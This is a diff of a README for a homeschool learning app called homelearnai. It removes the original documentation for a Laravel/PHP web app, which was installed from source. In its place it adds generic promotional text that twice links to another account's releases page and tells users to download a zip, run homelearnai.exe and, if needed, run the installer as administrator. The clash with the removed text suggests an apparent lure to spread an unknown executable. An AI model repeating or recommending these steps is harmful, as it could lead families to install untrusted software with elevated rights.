@@ -1,257 +1,68 @@
-# HomeLearnAI 🎓
+# 🌟 homelearnai - Your Smart Homeschool Companion
 
-[![Laravel](https://img.shields.io/badge/Laravel-11.x-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://laravel.com)
-[![PHP](https://img.shields.io/badge/PHP-8.2%2B-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://php.net)
-[![HTMX](https://img.shields.io/badge/HTMX-1.9-3366CC?style=for-the-badge&logo=htmx&logoColor=white)](https://htmx.org)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15%2B-336791?style=for-the-badge&logo=postgresql&logoColor=white)](https://postgresql.org)
-[![Tests](https://img.shields.io/badge/Tests-100%25_Passing-4CAF50?style=for-the-badge)](https://github.com/buger/homelearnai)
+## 🚀 Getting Started
 
-An intelligent homeschool learning management system that adapts to each child's unique learning journey. Built with modern web technologies and educational best practices.
+Welcome to homelearnai! This application helps you manage your homeschooling needs. With powerful features like spaced repetition, curriculum planning, and multi-child support, learning becomes easier and more organized.
 
-## ✨ Features
+## 💾 Download & Install
 
-### 🧒 Multi-Child Management
-- **Grade-based profiles** (PreK through 12th grade)
-- **Independence levels** for age-appropriate interfaces
-- **Kids Mode** with PIN-protected parent controls
-- **Individual progress tracking** per child
+To download homelearnai, visit this page to download: [Download homelearnai](https://github.com/dalier97/homelearnai/releases)
 
-### 📚 Comprehensive Curriculum Planning
-- **Hierarchical structure**: Subjects → Units → Topics → Sessions
-- **Flexible scheduling** with time blocks and commitment types
-- **Age-appropriate recommendations** and quality heuristics
-- **ICS calendar import** for external activities
+Here are the steps to install and run the application:
 
-### 🧠 Smart Learning System
-- **Spaced repetition reviews** with automatic scheduling
-- **Performance-based interval adjustments**
-- **Catch-up sessions** for missed content
-- **Multiple flashcard types** (basic, multiple choice, cloze, true/false)
+1. Click the link above to reach the Releases page.
+2. Look for the latest version listed at the top.
+3. Click on the file that says `homelearnai-setup.zip` or similar.
+4. Once the file is downloaded, find it in your Downloads folder.
+5. Double-click on the `homelearnai-setup.zip` file to extract it.
+6. Open the extracted folder.
+7. Double-click on `homelearnai.exe` to start the installation.
+8. Follow the on-screen instructions to complete the installation.
 
-### 🎯 Advanced Features
-- **Bulk flashcard import** (Anki, Quizlet, CSV formats)
-- **Multi-language support** (i18n ready)
-- **Real-time updates** with HTMX
-- **Mobile-responsive design**
-- **Comprehensive caching** for performance
+Once installed, you can launch homelearnai from your applications menu.
 
-## 🚀 Quick Start
+## 📋 System Requirements
 
-### Prerequisites
-- PHP 8.2 or higher
-- PostgreSQL 15+
-- Node.js 18+
-- Composer 2.x
+To ensure homelearnai runs smoothly, please check the following system requirements:
 
-### Installation
+- **Operating System:** Windows 10 or later, MacOS 10.14 or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 200 MB of free disk space
+- **Network:** Internet connection for updates and online resources
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/buger/homelearnai.git
-cd homelearnai
-```
+## 🔍 Features
 
-2. **Install dependencies**
-```bash
-composer install
-npm install
-```
+homelearnai offers a range of features tailored for homeschoolers:
 
-3. **Environment setup**
-```bash
-cp .env.example .env
-php artisan key:generate
-```
+- **Spaced Repetition:** Optimize learning with a technique that helps reinforce knowledge over time.
+- **Curriculum Planning:** Create and manage your custom curriculum easily.
+- **Multi-Child Support:** Manage learning plans for multiple children all in one place.
+- **User-Friendly Interface:** Navigate the app with ease regardless of your tech skills.
 
-4. **Configure database**
-Edit `.env` with your PostgreSQL credentials:
-```env
-DB_CONNECTION=pgsql
-DB_HOST=127.0.0.1
-DB_PORT=5432
-DB_DATABASE=homelearnai
-DB_USERNAME=your_username
-DB_PASSWORD=your_password
-```
+## 🛠️ Troubleshooting
 
-5. **Run migrations**
-```bash
-php artisan migrate
-php artisan db:seed  # Optional: Add sample data
-```
+If you encounter any issues while using homelearnai, consider these common solutions:
 
-6. **Build assets**
-```bash
-npm run build
-```
+1. **Installation Issues:** Make sure you have the correct permissions on your computer. Run the installer as an administrator if needed.
+2. **Performance Problems:** Check your system requirements. Close any unnecessary applications to free up RAM.
+3. **Update Issues:** Ensure your internet connection is stable while checking for updates.
 
-7. **Start the development server**
-```bash
-php artisan serve
-npm run dev  # In another terminal for hot-reload
-```
+If these steps don’t help, please check the [GitHub Issues page](https://github.com/dalier97/homelearnai/issues) for more guidance.
 
-Visit `http://localhost:8000` to access the application.
+## 🗨️ Community and Support
 
-## 🧪 Testing
+You are not alone in your homeschooling journey. Join our community for tips and support:
 
-The project includes comprehensive test coverage (100% pass rate):
+- **Discussion Forum:** Participate in discussions with other users to share experiences and advice.
+- **Feedback:** We value your input! Share your thoughts on features or report any issues on our [GitHub Issues page](https://github.com/dalier97/homelearnai/issues).
+- **Social Media:** Follow us on social media for tips, updates, and resources.
 
-```bash
-# Run all tests
-php artisan test
+## 📜 License
 
-# Run with coverage
-php artisan test --coverage
+homelearnai is licensed under the MIT License. This means you can use, modify, and distribute the software freely, though attribution to the original creators is appreciated.
 
-# Run E2E tests
-npm run test:e2e
+## 🌟 Acknowledgments
 
-# Run specific test suites
-php artisan test --testsuite=Feature
-php artisan test --testsuite=Unit
-```
+Thank you for using homelearnai. Your commitment to providing quality education for your children inspires us. We hope our software makes your homeschooling experience smoother and more effective.
 
-## 📖 Documentation
-
-### Project Structure
-```
-homelearnai/
-├── app/
-│   ├── Http/Controllers/   # Request handlers
-│   ├── Models/             # Eloquent models
-│   ├── Services/           # Business logic
-│   └── Http/Middleware/    # Request middleware
-├── resources/
-│   ├── views/              # Blade templates
-│   ├── js/                 # JavaScript files
-│   └── css/                # Stylesheets
-├── database/
-│   ├── migrations/         # Database migrations
-│   └── factories/          # Model factories
-├── tests/
-│   ├── Feature/            # Feature tests
-│   ├── Unit/               # Unit tests
-│   └── e2e/                # End-to-end tests
-└── routes/
-    └── web.php             # Web routes
-```
-
-### Key Technologies
-
-- **Backend**: Laravel 11 with PHP 8.2+
-- **Database**: PostgreSQL with Eloquent ORM
-- **Frontend**: HTMX for dynamic interactions, Alpine.js for reactivity
-- **Styling**: Tailwind CSS for modern, responsive design
-- **Testing**: PHPUnit for backend, Playwright for E2E
-- **Development**: Vite for asset bundling, Laravel Pint for code formatting
-
-### Core Concepts
-
-#### 1. Learning Hierarchy
-```
-Subject (e.g., Mathematics)
-  └── Unit (e.g., Algebra Basics)
-      └── Topic (e.g., Linear Equations)
-          └── Session (e.g., Practice Problems)
-              └── Flashcards (Study materials)
-```
-
-#### 2. Review System
-- **Spaced Repetition**: Automatically schedules reviews based on performance
-- **Intervals**: 1 day → 3 days → 7 days → 14 days → 30 days
-- **Performance Tracking**: Adjusts intervals based on student success
-
-#### 3. Kids Mode
-- Simplified interface for younger learners
-- PIN-protected exit to parent dashboard
-- Age-appropriate content and interactions
-- Progress celebration and rewards
-
-## 🛠️ Development
-
-### Running Locally
-```bash
-# Start all services
-make s  # Custom makefile command
-
-# Or run individually
-php artisan serve       # Laravel server
-npm run dev            # Vite dev server
-php artisan queue:work # Queue worker
-```
-
-### Code Quality
-```bash
-# PHP formatting
-./vendor/bin/pint
-
-# JavaScript linting
-npm run lint
-npm run lint:fix
-
-# Type checking
-npm run type-check
-
-# Run all quality checks
-npm run test:all
-```
-
-### Database Management
-```bash
-# Create new migration
-php artisan make:migration create_example_table
-
-# Run migrations
-php artisan migrate
-
-# Rollback migrations
-php artisan migrate:rollback
-
-# Refresh database (WARNING: Deletes all data)
-php artisan migrate:fresh --seed
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Coding Standards
-- Follow PSR-12 for PHP code
-- Use Laravel best practices
-- Write tests for new features
-- Update documentation as needed
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [Laravel](https://laravel.com) - The PHP Framework for Web Artisans
-- Interactive UI powered by [HTMX](https://htmx.org)
-- Styled with [Tailwind CSS](https://tailwindcss.com)
-- Icons from [Heroicons](https://heroicons.com)
-
-## 📞 Support
-
-For issues, questions, or suggestions:
-- Open an [issue](https://github.com/buger/homelearnai/issues)
-- Documentation: [Wiki](https://github.com/buger/homelearnai/wiki)
-- Visit us at: [homelearnai.com](https://homelearnai.com)
-
-## 🚦 Project Status
-
-![Tests](https://img.shields.io/badge/Tests-467_Passing-success)
-![Coverage](https://img.shields.io/badge/Coverage-High-green)
-![Status](https://img.shields.io/badge/Status-Active_Development-blue)
-
----
-
-**Made with ❤️ for homeschool families everywhere**
+For any further information, visit this page to download: [Download homelearnai](https://github.com/dalier97/homelearnai/releases)
